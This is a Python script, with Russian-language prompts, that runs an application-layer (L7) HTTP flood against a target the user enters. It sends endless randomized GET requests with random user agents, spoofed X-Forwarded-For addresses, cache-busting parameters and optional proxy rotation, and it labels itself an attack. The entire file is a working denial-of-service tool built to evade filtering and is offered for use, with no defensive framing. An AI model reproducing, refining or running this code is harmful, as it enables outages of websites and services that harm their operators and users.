import subprocess
import sys
import asyncio
import aiohttp
import random
import itertools

def install_dependencies():
    required = {
        'aiohttp': 'aiohttp',
        'aiohttp_socks': 'aiohttp-socks',
        'fake_useragent': 'fake-useragent'
    }
    
    for package, pip_name in required.items():
        try:
            __import__(package)
            print(f"{package} уже установлен")
        except ImportError:
            print(f"Установка {package}...")
            subprocess.check_call([sys.executable, "-m", "pip", "install", pip_name])

install_dependencies()

from fake_useragent import UserAgent
from aiohttp_socks import ProxyConnector

async def advanced_flood(target, threads_count, proxy_list=None):
    if not target.startswith(('http://', 'https://')):
        target = 'http://' + target
        
    ua = UserAgent()
    request_count = 0
    endpoints = ['', 'wp-admin', 'api/v1', 'login', 'static/img', 'data.json']
    
    if proxy_list:
        proxy_cycle = itertools.cycle(proxy_list)
    else:
        proxy_cycle = itertools.repeat(None)
        
    async def make_request(session):
        nonlocal request_count
        try:
            endpoint = random.choice(endpoints)
            url = f"{target}/{endpoint}?rnd={random.randint(1000,9999)}"
            headers = {
                'User-Agent': ua.random,
                'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Connection': 'keep-alive'
            }
            async with session.get(url, headers=headers, timeout=aiohttp.ClientTimeout(total=3)) as resp:
                pass
            request_count += 1
        except:
            pass

    connectors = []
    for i in range(threads_count):
        proxy = next(proxy_cycle)
        if proxy:
            connector = ProxyConnector.from_url(proxy)
        else:
            connector = aiohttp.TCPConnector(limit=0)
        connectors.append(connector)

    print(f"Запуск L7-флуда с {threads_count} потоками")
    print("CTRL+C для остановки")

    try:
        async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False)) as session:
            tasks = []
            while True:
                task = asyncio.create_task(make_request(session))
                tasks.append(task)
                if len(tasks) >= threads_count * 10:
                    await asyncio.gather(*tasks)
                    tasks.clear()
                print(f"\rОтправлено запросов: {request_count}", end='')
                await asyncio.sleep(0.1)
    except KeyboardInterrupt:
        print(f"\nАтака остановлена. Всего отправлено: {request_count} запросов")

if __name__ == "__main__":
    target = input("Введите цель: ").strip()
    try:
        threads = int(input("Количество потоков (200): ") or "200")
    except:
        threads = 200
        
    use_proxies = input("Использовать прокси? (y/n): ").lower().strip()
    proxy_list = []
    if use_proxies == 'y':
        proxy_file = input("Путь к файлу с проксями (формат proto://ip:port): ").strip()
        try:
            with open(proxy_file, 'r') as f:
                proxy_list = [line.strip() for line in f.readlines()]
            print(f"Загружено {len(proxy_list)} прокси")
        except:
            print("Файл не найден, работа без прокси")
    
    asyncio.run(advanced_flood(target, threads, proxy_list if proxy_list else None))
